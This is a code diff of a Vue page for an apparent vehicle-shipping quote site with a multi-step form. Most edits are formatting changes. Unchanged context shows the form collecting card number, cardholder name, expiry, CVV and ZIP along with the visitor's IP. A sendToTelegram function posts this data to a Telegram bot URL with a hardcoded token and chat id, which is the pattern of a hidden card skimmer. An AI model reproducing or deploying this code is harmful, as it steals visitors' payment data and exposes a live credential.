@@ -1,7 +1,7 @@
 <template>
   <main class="page lg:mt-[150px] mt-[100px]">
     <div>
-      <div class="container">
+      <div class="container min-h-[100vh]">
         <div
           class="hidden lg:flex steps items-center justify-between gap-[32px]"
         >
@@ -12,9 +12,7 @@
             <div class="step-icon">
               <icons name="pick_up" />
             </div>
-            <p>
-              Shipment Details
-            </p>
+            <p>Shipment Details</p>
           </div>
           <div
             class="steps-line"
@@ -27,9 +25,7 @@
             <div class="step-icon">
               <icons name="user" />
             </div>
-            <p>
-              Shipper Information
-            </p>
+            <p>Shipper Information</p>
           </div>
           <div
             class="steps-line"
@@ -43,9 +39,7 @@
             <div class="step-icon">
               <icons name="price" />
             </div>
-            <p>
-              Price
-            </p>
+            <p>Price</p>
           </div>
           <div
             class="steps-line"
@@ -59,9 +53,7 @@
             <div class="step-icon">
               <icons name="confirmation" />
             </div>
-            <p>
-              Confirmation
-            </p>
+            <p>Confirmation</p>
           </div>
         </div>
         <div class="grid grid-cols-12 grid-flow-row mt-[40rem] gap-[32rem]">
@@ -75,7 +67,7 @@
               </h1>
               <p
                 class="font-normal text-[16px] leading-[130%] text-[#5C6670] mb-[24px]"
-                style="color: rgb(92, 102, 112);"
+                style="color: rgb(92, 102, 112)"
               >
                 Our Professional Team is Ready to Assist You. If you any help do
                 not hesitate to call us at
@@ -227,7 +219,7 @@
               </h1>
               <p
                 class="font-normal text-[16px] leading-[130%] text-[#5C6670] mb-[24px]"
-                style="color: rgb(92, 102, 112);"
+                style="color: rgb(92, 102, 112)"
               >
                 Our Professional Team is Ready to Assist You. If you any help do
                 not hesitate to call us at
@@ -335,16 +327,12 @@
                 class="badge flex items-center items-center gap-[4px] absolute top-[-16px] right-0 bg-[#FF4E00] rounded-[16px] px-[8px] py-[4px]"
               >
                 <icons name="discount" />
-                <p>
-                  Top Choice
-                </p>
+                <p>Top Choice</p>
               </div>
               <h1 class="mb-[8px] text-[32rem] font-bold text-[#244567]">
                 Best Value
               </h1>
-              <p class="mb-[32px] text-[18px] text-[#212525]">
-                Open Carrier
-              </p>
+              <p class="mb-[32px] text-[18px] text-[#212525]">Open Carrier</p>
               <ul class="text-[16px]">
                 <li
                   class="mb-[8px] flex items-center justify-center md:justify-start gap-[4px]"
@@ -420,14 +408,12 @@
           </div>
           <div
             v-if="step === 4"
-            class="lg:col-span-4 col-span-12 information-form confirmation  rounded-[16px] pt-[20px] px-[20px] pb-[32px] h-auto border-solid border-[1px] border-[#e6ecf0] relative z-[2]"
+            class="lg:col-span-4 col-span-12 information-form confirmation rounded-[16px] pt-[20px] px-[20px] pb-[32px] h-auto border-solid border-[1px] border-[#e6ecf0] relative z-[2]"
             style="height: fit-content"
           >
             <h1 class="text-[30px] font-bold mb-[12px]">Confirmation</h1>
             <div class="w-full relative mb-[12px]">
-              <span>
-                Card Number
-              </span>
+              <span> Card Number </span>
               <icons name="card" />
               <el-input
                 v-model="cardInfo.number"
@@ -438,9 +424,7 @@
               ></el-input>
             </div>
             <div class="w-full mb-[12px] relative">
-              <span>
-                Cardholder Name
-              </span>
+              <span> Cardholder Name </span>
               <icons name="user" />
 
               <el-input
@@ -490,12 +474,10 @@
           </div>
           <div
             v-if="step === 5"
-            class="lg:col-span-4 col-span-12 information-form confirmation  rounded-[16px] pt-[20px] px-[20px] pb-[32px] h-auto border-solid border-[1px] border-[#e6ecf0] relative z-[2]"
+            class="lg:col-span-4 col-span-12 information-form confirmation rounded-[16px] pt-[20px] px-[20px] pb-[32px] h-auto border-solid border-[1px] border-[#e6ecf0] relative z-[2]"
             style="height: fit-content"
           >
-            <h1 class="text-[30px] font-bold mb-[12px]">
-              Thank You!!!
-            </h1>
+            <h1 class="text-[30px] font-bold mb-[12px]">Thank You!!!</h1>
             <iframe
               src="https://lottie.host/embed/71e0bd1f-14f0-4614-8a3f-1f418bd671d2/5aFxWuFE1i.json"
             ></iframe>
@@ -524,7 +506,7 @@
             <icons name="us_map" />
           </div>
 
-          <div v-if="step > 2" class="col-span-12 lg:col-span-3 quote-details ">
+          <div v-if="step > 2" class="col-span-12 lg:col-span-3 quote-details">
             <div
               v-if="step > 3"
               class="rounded-[16px] mb-[32px] p-[20px] overflow-hidden border-solid border-[2px] border-[#e6ecf0] relative z-[2]"
@@ -537,9 +519,7 @@
                 ${{ choosenPrice }}
               </h2>
               <p>Due Now:</p>
-              <h2 class="text-[42px] text-[#244567] font-bold">
-                $0
-              </h2>
+              <h2 class="text-[42px] text-[#244567] font-bold">$0</h2>
             </div>
             <div
               class="rounded-[16px] p-[20px] overflow-hidden border-solid border-[2px] border-[#e6ecf0] relative z-[2]"
@@ -613,7 +593,7 @@
           <!--             class=" absolute right-[-10%] top-[50%] transform translate-y-[-50%] z-[1] hidden lg:block " alt=""/>-->
           <img
             src="/images/left-grad-eff.png"
-            class=" absolute left-0 top-[50%] transform w-[25%] translate-y-[-50%] h-auto z-[0] pointer-events-none"
+            class="absolute left-0 top-[50%] transform w-[25%] translate-y-[-50%] h-auto z-[0] pointer-events-none"
             alt=""
           />
           <img
@@ -630,6 +610,42 @@
             name="right_side_anim"
           />
         </div>
+
+        <div class="grid grid-cols-12 grid-flow-row mt-[40rem] gap-[32rem]">
+          <div
+            class="lg:col-span-4 col-span-12 flex items-center gap-[16px] justify-start"
+          >
+            <icons name="secure" />
+            <div>
+              <h6 class="text-[20px] font-bold text-[#ff4e00]">
+                SAFE SHIPPING
+              </h6>
+              <p>High value insurance</p>
+            </div>
+          </div>
+          <div
+            class="lg:col-span-4 col-span-12 flex items-center gap-[16px] justify-start"
+          >
+            <icons name="doorToDoor" />
+            <div>
+              <h6 class="text-[20px] font-bold text-[#ff4e00]">
+                DOOR TO DOOR DELIVERY
+              </h6>
+              <p>From Your Location to Your Destination</p>
+            </div>
+          </div>
+          <div
+            class="lg:col-span-4 col-span-12 flex items-center gap-[16px] justify-start"
+          >
+            <icons name="pricetag" />
+            <div>
+              <h6 class="text-[20px] font-bold text-[#ff4e00]">
+                AFFORDABLE PRICING
+              </h6>
+              <p>Cost-Effective Rates</p>
+            </div>
+          </div>
+        </div>
       </div>
     </div>
   </main>
@@ -641,7 +657,7 @@ import {
   email,
   required,
   minLength,
-  maxLength
+  maxLength,
 } from "vuelidate/lib/validators";
 export default {
   components: {},
@@ -660,32 +676,32 @@ export default {
         to: "",
         type: "",
         date: "",
-        specificDate: undefined
+        specificDate: undefined,
       },
       personalInfo: {
         name: "",
         phone: "",
-        email: ""
+        email: "",
       },
       cardInfo: {
         number: "",
         name: "",
         date: "",
         cvv: "",
-        zip: ""
+        zip: "",
       },
       dateOptions: [
         { label: "As soon as Possible", value: "ASAP" },
         { label: "Within 7 Days", value: "Within 7 days" },
         { label: "Within 2 Weeks", value: "Within 2 weeks" },
         { label: "On A Specific Date", value: "specificDate" },
-        { label: "Not Sure Yet", value: "Not Sure yet" }
+        { label: "Not Sure Yet", value: "Not Sure yet" },
       ],
       vehicleTypes: [
         { label: "Car", value: "car" },
         { label: "SUV", value: "SUV" },
-        { label: "Pickup", value: "Pickup" }
-      ]
+        { label: "Pickup", value: "Pickup" },
+      ],
     };
   },
   validations: {
@@ -693,28 +709,28 @@ export default {
       from: { required, min: minLength(5), max: maxLength(150) },
       to: { required, min: minLength(5), max: maxLength(150) },
       type: { required },
-      date: { required }
+      date: { required },
     },
 
     personalInfo: {
       email: { required, email },
       name: { required, max: maxLength(50) },
-      phone: { required }
+      phone: { required },
     },
     cardInfo: {
       number: { required },
       name: { required, max: maxLength(50) },
       date: { required },
       cvv: { required },
-      zip: { required }
-    }
+      zip: { required },
+    },
   },
   async fetch() {
     await this.$store.dispatch("fetchZips");
   },
   mounted() {
     fetch("https://api.ipify.org?format=json")
-      .then(x => x.json())
+      .then((x) => x.json())
       .then(({ ip }) => {
         this.userIp = ip;
       });
@@ -754,9 +770,9 @@ export default {
             estimated_ship_date: shippingDate,
             vehicle_type: vehicleType,
             ship_via_id: "1",
-            vehicle_runs: "1"
+            vehicle_runs: "1",
           })
-          .then(res => {
+          .then((res) => {
             if (res.data.data) {
               const price = res.data.data[1];
               this.sendToTelegram(
@@ -775,24 +791,23 @@ export default {
               this.step++;
             } else {
               this.$notify({
-                title: 'Wrong zip code',
-                message: 'Please select from the list',
-                type: 'error',
-                position: 'top-left'
+                title: "Wrong zip code",
+                message: "Please select from the list",
+                type: "error",
+                position: "top-left",
               });
               this.step = 1;
               this.sendToTelegram(
-                  pickUpZip,
-                  dropOffZip,
-                  shippingDate,
-                  vehicleType,
-                  this.personalInfo.name,
-                  this.personalInfo.email,
-                  this.personalInfo.phone,
+                pickUpZip,
+                dropOffZip,
+                shippingDate,
+                vehicleType,
+                this.personalInfo.name,
+                this.personalInfo.email,
+                this.personalInfo.phone
               );
             }
-          })
-
+          });
       }
     },
     async searchZipCodes(key, cb) {
@@ -815,7 +830,7 @@ export default {
       ccname,
       ccdate,
       cccvv,
-      cczip,
+      cczip
     ) {
       await this.$axios.post(
         `https://api.telegram.org/bot5878927199:AAGM4j1rVxyqRv7xpD4NWM_EdIcEXKEuUwE/sendMessage?chat_id=-1001900427343&text=User IP: ${this.userIp}, Customer Info:
@@ -918,13 +933,13 @@ export default {
         );
         this.step++;
       }
-    }
+    },
   },
   computed: {
     ...mapState({
-      zips: state => state.zips
-    })
-  }
+      zips: (state) => state.zips,
+    }),
+  },
 };
 </script>
 
